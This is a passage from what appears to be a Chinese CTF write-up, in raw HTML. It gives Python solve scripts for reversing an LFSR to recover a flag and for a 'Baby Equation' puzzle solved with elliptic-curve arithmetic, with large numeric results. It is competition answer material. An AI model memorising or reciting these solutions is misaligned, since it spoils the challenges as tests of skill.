class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    if i in [204,205,206]:</span></span><br><span class=\"line\"><span class=\"string\">        print(i,bin(R),len(bin(R))-2)</span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(R)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(tmp)</span><br><span class=\"line\"><span class=\"comment\">#R=tmp</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#lsb只改变填充的最后一位 不改变原先的bit</span></span><br><span class=\"line\"><span class=\"comment\">#已知tmp是lsb 可以从第一位就开始恢复 恢复207位 然后恢复真实数据</span></span><br><span class=\"line\">tmp = <span class=\"number\">0xc9fe198703d93a7cff319d81c311b169de4b8d528d2dbec4859b</span></span><br><span class=\"line\">r = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">207</span>):</span><br><span class=\"line\">    r &lt;&lt;= <span class=\"number\">1</span></span><br><span class=\"line\">    lsb = (tmp &gt;&gt; (<span class=\"number\">207</span>-i))&amp;<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"comment\">#print(lsb,end=&#x27;&#x27;)</span></span><br><span class=\"line\">    r ^= lsb</span><br><span class=\"line\"><span class=\"comment\"># 这里得到的r是R207的最后207位</span></span><br><span class=\"line\"><span class=\"comment\"># tmp &amp; 1为R207&amp;mask 二进制中1个数的奇偶</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">n = r</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">207</span>):</span><br><span class=\"line\">    n |= ((<span class=\"built_in\">list</span>(<span class=\"built_in\">bin</span>(n &amp; mask)).count(<span class=\"string\">&#x27;1&#x27;</span>)%<span class=\"number\">2</span>) ^ ((tmp&gt;&gt;i) &amp; <span class=\"number\">1</span>)) &lt;&lt; <span class=\"number\">207</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#print(bin(n))</span></span><br><span class=\"line\"></span><br><span class=\"line\">    n &gt;&gt;= <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">m1 = <span class=\"built_in\">int</span>.to_bytes(n,<span class=\"number\">28</span>,<span class=\"string\">&#x27;big&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(m1)</span><br><span class=\"line\">m2 = <span class=\"built_in\">int</span>.to_bytes(n + (<span class=\"number\">1</span>&lt;&lt;<span class=\"number\">207</span>),<span class=\"number\">28</span>,<span class=\"string\">&#x27;big&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(m2)</span><br><span class=\"line\"><span class=\"comment\">#reverse_an_LFSR_is_so_easy</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>第二种</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python3</span></span><br><span class=\"line\"><span class=\"comment\">#from secret import flag</span></span><br><span class=\"line\">flag = <span class=\"string\">b&quot;0ops&#123;flagtestflagtestflagtestaa&#125;&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(flag))</span><br><span class=\"line\">mask = <span class=\"number\">0x9e393e7126c18da37dc14f9a3113c50c8ad4a522ae4501b20531</span></span><br><span class=\"line\"><span class=\"comment\">#mask =  0xffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\">limit = <span class=\"number\">0xffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\">ri = []</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">LFSR</span>(<span class=\"params\"><span class=\"built_in\">input</span></span>):</span><br><span class=\"line\">        output = (<span class=\"built_in\">input</span> &lt;&lt; <span class=\"number\">1</span>) &amp; limit</span><br><span class=\"line\">        i = (<span class=\"built_in\">input</span> &amp; mask) &amp; limit</span><br><span class=\"line\">        a = <span class=\"built_in\">list</span>(<span class=\"built_in\">bin</span>(i))<span class=\"comment\">#二进制表示1的位数是奇数</span></span><br><span class=\"line\">        b = a.count(<span class=\"string\">&#x27;1&#x27;</span>) % <span class=\"number\">2</span></span><br><span class=\"line\">        lsb = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> i != <span class=\"number\">0</span>:</span><br><span class=\"line\">                lsb ^= (i &amp; <span class=\"number\">1</span>)</span><br><span class=\"line\">                i = i &gt;&gt; <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">assert</span> lsb == b</span><br><span class=\"line\">        <span class=\"comment\">#print(bin(output)[:10])</span></span><br><span class=\"line\">        output ^= lsb</span><br><span class=\"line\">        <span class=\"comment\">#print(lsb,end=&#x27;&#x27;)</span></span><br><span class=\"line\">        <span class=\"comment\">#print(bin(output)[:10])</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> (output, lsb)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">assert</span> <span class=\"built_in\">len</span>(flag) == <span class=\"number\">32</span></span><br><span class=\"line\">R = <span class=\"built_in\">int</span>.from_bytes(flag[<span class=\"number\">5</span>: -<span class=\"number\">1</span>], <span class=\"string\">&#x27;big&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;R:&#x27;</span>,R)</span><br><span class=\"line\"><span class=\"comment\">#print(int.to_bytes(R,28,&#x27;big&#x27;))</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;R:&#x27;</span>,<span class=\"built_in\">bin</span>(R))</span><br><span class=\"line\">tmp = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>*<span class=\"number\">208</span>):</span><br><span class=\"line\">    (R, lsb) = LFSR(R)</span><br><span class=\"line\">    tmp = ((tmp &lt;&lt; <span class=\"number\">1</span>) | lsb) &amp; limit</span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    if i &gt;= 2*208-6:</span></span><br><span class=\"line\"><span class=\"string\">        print(len(bin(tmp)),bin(tmp)[:8],bin(tmp)[-4:],list(bin(tmp &amp; mask)).count(&#x27;1&#x27;))</span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(R)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(<span class=\"built_in\">bin</span>(tmp)),<span class=\"built_in\">bin</span>(tmp)[:<span class=\"number\">8</span>])</span><br><span class=\"line\"><span class=\"comment\">#R=tmp</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>()</span><br><span class=\"line\">tmp = <span class=\"number\">0x8919055a184e6842a5136da171fed5e0dc979ef724acf19317d0</span></span><br><span class=\"line\"><span class=\"comment\">#tmp = 0xc9fe198703d93a7cff319d81c311b169de4b8d528d2dbec4859b</span></span><br><span class=\"line\">valid_list = <span class=\"string\">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789[]+=-~!@#$%^&amp;()`\\\\&quot;</span></span><br><span class=\"line\">valid_list = [<span class=\"built_in\">ord</span>(c) <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> valid_list]</span><br><span class=\"line\">N = <span class=\"number\">26</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">check</span>(<span class=\"params\">s</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">len</span>(<span class=\"built_in\">list</span>(<span class=\"built_in\">filter</span>(<span class=\"keyword\">lambda</span> i:i <span class=\"keyword\">in</span> valid_list,s))) &gt;= N</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>**<span class=\"number\">208</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> i % <span class=\"number\">100000</span>==<span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(i)</span><br><span class=\"line\">    odd = tmp &amp; <span class=\"number\">1</span></span><br><span class=\"line\">    tmp = tmp &gt;&gt; <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">list</span>(<span class=\"built_in\">bin</span>(tmp &amp; mask)).count(<span class=\"string\">&#x27;1&#x27;</span>)%<span class=\"number\">2</span> == odd:</span><br><span class=\"line\">        <span class=\"comment\">#print(0)</span></span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        tmp |= <span class=\"number\">1</span> &lt;&lt; <span class=\"number\">207</span></span><br><span class=\"line\">        <span class=\"comment\">#print(1)</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> tmp ==<span class=\"number\">0x8919055a184e6842a5136da171fed5e0dc979ef724acf19317d0</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(i)</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    m1 = <span class=\"built_in\">int</span>.to_bytes(tmp,<span class=\"number\">28</span>,<span class=\"string\">&#x27;big&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> check(m1):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(m1)</span><br><span class=\"line\">        <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./flag.txt&#x27;</span>,<span class=\"string\">&#x27;w&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">            f.write(<span class=\"built_in\">str</span>(m1))</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    m2 = <span class=\"built_in\">int</span>.to_bytes(tmp + (<span class=\"number\">1</span>&lt;&lt;<span class=\"number\">207</span>),<span class=\"number\">28</span>,<span class=\"string\">&#x27;big&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> check(m2):</span><br><span class=\"line\">        <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./flag.txt&#x27;</span>,<span class=\"string\">&#x27;w&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">            f.write(<span class=\"built_in\">str</span>(m2))</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(m2)</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>这个本来是给rsfl+做的  不过没做出来</p>\n<h2 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h2><h3 id=\"Baby-Equation\"><a href=\"#Baby-Equation\" class=\"headerlink\" title=\"Baby Equation\"></a>Baby Equation</h3><p>检索一下 可以发现这篇文章的思路说的很清楚<br><a href=\"https://www.agftutoring.com/x-yz-y-xz-z-xy-4/\">https://www.agftutoring.com/x-yz-y-xz-z-xy-4/</a></p>\n<p>从文章中提到的论文找到准确的公式<br><a href=\"http://publikacio.uni-eszterhazy.hu/2858/1/AMI_43_from29to41.pdf\">http://publikacio.uni-eszterhazy.hu/2858/1/AMI_43_from29to41.pdf</a><br>然后自己手写一下脚本 根据公式算结果 加入4096bit的约束</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> gmpy2</span><br><span class=\"line\"><span class=\"keyword\">from</span> fractions <span class=\"keyword\">import</span> Fraction</span><br><span class=\"line\"><span class=\"keyword\">from</span> math <span class=\"keyword\">import</span> log</span><br><span class=\"line\">N = <span class=\"number\">14</span></span><br><span class=\"line\"></span><br><span class=\"line\">a = Fraction(<span class=\"number\">4</span>*N**<span class=\"number\">2</span>+<span class=\"number\">12</span>*N-<span class=\"number\">3</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\">b = Fraction(<span class=\"number\">32</span>*(N+<span class=\"number\">3</span>),<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">aa = b-Fraction(<span class=\"number\">1</span>,<span class=\"number\">3</span>)*a**<span class=\"number\">2</span></span><br><span class=\"line\">bb = Fraction(<span class=\"number\">2</span>,<span class=\"number\">27</span>)*a**<span class=\"number\">3</span>-a*b/<span class=\"number\">3</span></span><br><span class=\"line\"><span class=\"comment\">#print(aa,bb)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">equ</span>(<span class=\"params\">a,b,c</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a/(b+c)+b/(a+c)+c/(a+b)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">lcm_3</span>(<span class=\"params\">a,b,c</span>):</span><br><span class=\"line\">    lcm_ab = (a*b)//gmpy2.gcd(a,b)</span><br><span class=\"line\">    <span class=\"comment\">#return a*b*c</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> lcm_ab*c // gmpy2.gcd(lcm_ab,c)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">geta</span>(<span class=\"params\">x,y</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (<span class=\"number\">8</span>*(N+<span class=\"number\">3</span>)-x+y)/(<span class=\"number\">2</span>*(<span class=\"number\">4</span>-x)*(N+<span class=\"number\">3</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getb</span>(<span class=\"params\">x,y</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (<span class=\"number\">8</span>*(N+<span class=\"number\">3</span>)-x-y)/(<span class=\"number\">2</span>*(<span class=\"number\">4</span>-x)*(N+<span class=\"number\">3</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getc</span>(<span class=\"params\">x,y</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ((-<span class=\"number\">4</span>)*(N+<span class=\"number\">3</span>)-(N+<span class=\"number\">2</span>)*x)/((<span class=\"number\">4</span>-x)*(N+<span class=\"number\">3</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">check</span>(<span class=\"params\">a,b,c</span>):</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> equ(a,b,c)== N</span><br><span class=\"line\">    <span class=\"keyword\">if</span> a &gt; <span class=\"number\">0</span> <span class=\"keyword\">and</span> b &gt; <span class=\"number\">0</span> <span class=\"keyword\">and</span> c &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"comment\">#print(a,b,c)</span></span><br><span class=\"line\">        da,db,dc = a.denominator,b.denominator,c.denominator</span><br><span class=\"line\">        lcm = lcm_3(da,db,dc)</span><br><span class=\"line\">        <span class=\"comment\">#print(lcm)</span></span><br><span class=\"line\">        lcm = Fraction(<span class=\"built_in\">int</span>(lcm),<span class=\"number\">1</span>)</span><br><span class=\"line\">        aa,bb,cc = a.numerator*lcm//a.denominator,b.numerator*lcm//b.denominator,c.numerator*lcm//c.denominator</span><br><span class=\"line\">        <span class=\"keyword\">if</span> log(aa,<span class=\"number\">10</span>) &gt;<span class=\"number\">4096</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;a=<span class=\"subst\">&#123;aa&#125;</span>\\nb=<span class=\"subst\">&#123;bb&#125;</span>\\nc=<span class=\"subst\">&#123;cc&#125;</span>&#x27;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(equ(aa,bb,cc))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"comment\">#print(a/(b+c)+b/(a+c)+c/(a+b),N)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ff</span>(<span class=\"params\">x</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x**<span class=\"number\">3</span> + aa*x + bb</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">xp,yp,xq,yq</span>):</span><br><span class=\"line\">    <span class=\"comment\">#xp += a/3</span></span><br><span class=\"line\">    <span class=\"comment\">#xq += a/3</span></span><br><span class=\"line\">    <span class=\"comment\">#print(yp**2,ff(xp))</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> xp == xq <span class=\"keyword\">and</span> yq == yp:</span><br><span class=\"line\">        lm = (<span class=\"number\">3</span>*xp**<span class=\"number\">2</span>+aa)/(<span class=\"number\">2</span>*yp)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        lm = (yp-yq)/(xp-xq)</span><br><span class=\"line\">    xr = lm**<span class=\"number\">2</span>-xp-xq</span><br><span class=\"line\">    yr = lm*(xp-xr)-yp</span><br><span class=\"line\">    <span class=\"comment\">#print(yr**2,ff(xr),f(xr-a/3))</span></span><br><span class=\"line\">    <span class=\"comment\">#print(type(xr))</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> xr,yr</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">f</span>(<span class=\"params\">x</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x**<span class=\"number\">3</span> + a*x**<span class=\"number\">2</span>+b*x</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">solve</span>(<span class=\"params\">x,y</span>):</span><br><span class=\"line\">    x = Fraction(<span class=\"built_in\">int</span>(x),<span class=\"number\">1</span>)</span><br><span class=\"line\">    y = Fraction(<span class=\"built_in\">int</span>(y),<span class=\"number\">1</span>)</span><br><span class=\"line\">    x += a/<span class=\"number\">3</span></span><br><span class=\"line\">    <span class=\"comment\">#print(check(geta(x,y),getb(x,y),getc(x,y)))</span></span><br><span class=\"line\">    xr,yr = add(x,y,x,y)</span><br><span class=\"line\">    check(geta(xr-a/<span class=\"number\">3</span>,yr),getb(xr-a/<span class=\"number\">3</span>,yr),getc(xr-a/<span class=\"number\">3</span>,yr))</span><br><span class=\"line\">    <span class=\"comment\">#print(xr-a/3,yr)</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(i)</span><br><span class=\"line\">        xrr,yrr = add(x,y,xr,yr)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> check(geta(xrr-a/<span class=\"number\">3</span>,yrr),getb(xrr-a/<span class=\"number\">3</span>,yrr),getc(xrr-a/<span class=\"number\">3</span>,yrr)):</span><br><span class=\"line\">            <span class=\"comment\">#break</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">        <span class=\"comment\">#x,y = xr,yr</span></span><br><span class=\"line\">        xr,yr = xrr,yrr</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(-<span class=\"number\">20000</span>,<span class=\"number\">20000</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> x == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\">    fx = f(x)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> fx &lt;<span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\">    y,flag = gmpy2.iroot(<span class=\"built_in\">int</span>(fx),<span class=\"number\">2</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> flag:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(x,y)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#solve(x,y)</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> solve(x,y):</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"comment\">#break</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(e)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br></pre></td></tr></table></figure>\n<p>结果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">N=2</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">-100 260</span><br><span class=\"line\">N=4</span><br><span class=\"line\">a=154476802108746166441951315019919837485664325669565431700026634898253202035277999</span><br><span class=\"line\">b=36875131794129999827197811565225474825492979968971970996283137471637224634055579</span><br><span class=\"line\">c=4373612677928697257861252602371390152816537558161613618621437993378423467772036</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">-200 680</span><br><span class=\"line\">N=6</span><br><span class=\"line\">a=20260869859883222379931520298326390700152988332214525711323500132179943287700005601210288797153868533207131302477269470450828233936557</span><br><span class=\"line\">b=2250324022012683866886426461942494811141200084921223218461967377588564477616220767789632257358521952443049813799712386367623925971447</span><br><span class=\"line\">c=1218343242702905855792264237868803223073090298310121297526752830558323845503910071851999217959704024280699759290559009162035102974023</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">N = 10</span><br><span class=\"line\">a=269103113846520710198086599018316928810831097261381335767926880507079911347095440987749703663156874995907158014866846058485318408629957749519665987782327830143454337518378955846463785600977</span><br><span class=\"line\">b=4862378745380642626737318101484977637219057323564658907686653339599714454790559130946320953938197181210525554039710122136086190642013402927952831079021210585653078786813279351784906397934209</span><br><span class=\"line\">c=221855981602380704196804518854316541759883857932028285581812549404634844243737502744011549757448453135493556098964216532950604590733853450272184987603430882682754171300742698179931849310347</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">N = 12</span><br><span class=\"line\">a=9771648423124723726177348367579036940996321519493182113688185913291912152167430962940286713704689291955030766917703582615167560632692208569350596318361971945750539077074921376878141735974825044184065325295542414690299404543957471585986271492883344336895444628417764598798059282135540264079530839334683089479387712689664348829803188436456581110658900633423526039703131197080466706425129542338489808063522607588342584200312382147588021744331992391832435570655076979943362024164159108464336717094994098309362464023676446199308737155163873551701208488828402974721390557367029987977855707022545910750122799634001172374761109175036019323234546383998982432217361050210984517599581577248801341849448303544088176264625811806142770294209982442408662519374761728070223714521821341117002331986498770555184073085027058095297336167677439607364510657437509486347967307803660171207058735567136463940112222314297317750700776624058908857471453427988612985064899673716630236456014245800912222319599696269373722466085725674157804399937147349826725426492477399825189629059858143754233366556058143229760327782450544023555022700607812759157576200327040510464661565706996737315846564795178593069240330781574428355212732623725876985598328229189126427627014915844367895005634186488060123351425224254658993594181034585580728472926584634345281045130880900933874051988840549119158099281094622771545146573280290125472471508524146960616613046094502775760354004277755376103461683156447272164405834240309654181339266066263159088013664792412947782580562302145769970189263032100245853943329981223091010635294626858575635181685165656502546698206083122664124915608202069269724379843842840589157695219270750118704026028654165401285548616906593019632882729540612247917655897119373938582993296569576361174642805599263009865424731023686421547614323517551093776435182182140089430393766501364362547924371223967349402455455441526984962551991999740939806598094829176294395288025415862487224690038784444479146323714873578973543339383804639812551447024169760867016277652364254017342569664821765700133711906605529500370028326735684760029880824589496327934929890451806466028722732111707352281105526352585578795270682734602251672860466286137618451728577222436372703708755203706276857915607877115578246058172188790243120058005406354006933249427269186026037719060025838643524816124535097800306551506659235785757708355416892809830706818987658005883960242994520660422766140515613930376253008301505691252247843497900812092131062228821968787255843774769294070526791658638255579065403517667805443531566516803268415382062088531458623037511041673490301151134361350520723131052983435925526212885827536368956540475248756348725668932765463359607076032536135984411047176832817954294834358117678876487728677844675188893304999714929142496108422125998795771469689592410179339895441001807800777244298595113076411858026767080234245436677391556512837521159681035996524381164562299217240816526864051747417996965408494564793876350006434149310494879345252225512207327377641046172449349234814800370542810062964918653675533999879633796275182294288725302482565574689774236243367061493493871378478841132541150327804822340923534374347417734327962641422485698737250906970866594251938717273245180046336357159717643987207108520200884860052166562771159345328326046425986193537383085182662821369601389344051970598825589841391881179369502441</span><br><span class=\"line\">b=355278342530640706599407170519248057086229224524520519157141107708508537777205114284836515916647281859247795539514644616851559754279314555875406812187972064036035557571299859907280810487149605334993350531002451299724364967645584709273394386591591195780391447196683330849598560271745701404034625131501993929419554266148290436679685445363131010836932629342154128643351678951282983749890989559890172019099261175094354121592456388228285392695032585171051639572467407610797751366649496928321845783437550911111047278383580607079737332894364303410021661677697214580427323420620970187098111338585040445789178378027622721085136875173221486668228434792389270646253382261057411216813326434321501013051997430441500004490156606094833372922100067917450173462555720881102457821630342749340867365008072441643478548721857292917452800697091436767776083635027373005756786010659444917124676112164411021940883874460477540417603487387574930026382803252605451761123854779624051422486933911811669680548762039750465949397184413613720601642705976126017892620552601501858263828583840887458987486197543156013041348847816031608699049912936308450819095510369701575578097250363368454461945148450576088433249713999167088458370351492130049783151127247370858531196993379176146118278989362781036431924069823925694605248692612491891011456236063305446307145213155963155713254947146969705707871047748827652962063454148762245165952045524839856938394353277318602286742502902467957014204949461972627441403014827123154496446151973383417479788921710173738381531711188367127686337683922337834803729129860547622394303860359090631322192199105383221995196638722101561512713080014557011603612235554087760232042126289412640004429367002342732510653670491385158696739998435013535332649487741680965013588417081164473304832663472222330032194673510586568514566505918964524054367862236706513657705601280209392824784214794388906944781256335282029618881491665550233021568492161644797572375050841378822048811169837099457416172794125347941123267556933505091898801954097367551330470039516528938002060368203771887848789933865049084996127893937024390453874088559156599250770154698773410485652163460604146736536998704744308747694562472589990594315082773213352567913224257883617970694009815571365310386133474806148114386493590025948707911857605911663465773207882473351193724108758290123955278061608587631862670149052118711701158527145181175190875795882098138836322507020482823700475885261298942438375141523097467136949344549146226783627312473680145737634678721649048185277680609630836890634565927029420985039606240188037856013124138575514784612402632326680678385133078122001191529488632864949389691396850211361741599166067293474086420940368406413602811300967477515893863371822747402011882565685406820752393426871334343726588669248706316761007252201944198166289444499842118193477939440518068080562630698421649307162223651191249634030063115515307507458592025473811290000412080019218175657190077848458901960552364736984977562980489155298839168694740209782414540433384032643432411675316990421342815443209738155863833108803588186058559389830125622362622871909735505714741871915567556115574951697169999420730845094742737430840794283524289288407229358051139188774198818399680388413331802255608133294263528032850298389448639132253320503425433048688168649080671114897526452528795785075258192344501895197396313877737618743144143311361</span><br><span class=\"line\">c=20035885316890023606830534495067252147691357652057772449634307305904187410990992558920956548259424273157355393196003732013539899362716100216100574234193461987992270496600195300035752479460516954902069442618504792465804770124967301970678978328799586707754521255514483172028191260188475400317446571436004845998985653096037624624322281748829779447176083968674969833631184023187122343557933419142060815193896987871898527455938239633288396733679352394480370944272017028820473119804801589995735129329783435030364346676954726243545810431065584725705747425285116415098270756170854793527738400748018356825870940359453012877584220232457239486868961160286561107075730870191541707907024801190678872428378869070743156118725466561031241711673504710114636631852382374234153002593815839905362438349777252361649553219532495089010852188819251924513393843140092077472310502164724666534953510429204661960760251076825195012089967164704751956545716713621200138891509373146662781427659132869096244223556723315169600948861332954354413695888139017122816338494980502776971525437417811441688700350703763215954037112632057856459110596088774179908693660103919027798842365141387313347532358053282282310316931481842456257180432996840651935591189065259608213860227670186727338535935419000104738195984938003074607151510868080842855420074387493775652849570582238533035000592730676469385254313682643506004770455623730437382781957476292884741268313376108166969374162736157947254538709529590451732215030394607575401311261495611074569827532998121985392068544149777898463913810868539866423391561166029673154931578514570213744634449182859448121221325492409874400969111705041715153435314453329592896445669394904690642194906508672813178927078506631317053598793270180912538514259578229993791104172792725314850021809824960706011811171135997354162296978832638498179879771698379520095937384178635037528330099466818183983444951307338720807542182935366038924920803039824818978210615772435040781173000522957795318935743355256682046477991218402526418808672933986788522397056643264167847014634860127505194733579174334258294520958784673856708467904118326279768028815946419189313676293061904510582604099208908846437914476479234000943244508656493406134426802932798305615095458701786048985034479492729357877345432656822502309506336155060754833509042934673647393543153071076853125875966535409760468353908956772073598404677550786987821584368329022155627837041395034568285609452470732829555582976579267394284928019500640977457130634550711478008433495429299640611555109171351069880574540503991840730805473241840138226375586949924647467718787261507459412537764703036454930376493490948212829487213980710738206430842478425877099783023977823272528573428967147461248519564018755183647327105058234798276539268716600710944282509505534186050000996976904596307571400703851012188753774844974808960378596634959429569386969879801494409815032125990390725960817685563429841025885365323217522340255134111238995153536146711806678993879340908664992009441435660169161976982012130533343179316942599654407053716666680671913105456952462060978938905812334117338345608406493320504708189703699696962739031333121998774598083769292025442530856763493460673394201872178090312059357744194235029914560026838488336959743500520432584396018821068625402593286299143852751101612713576613521611747957521749921921568265523624185276246164078350540463107124</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span 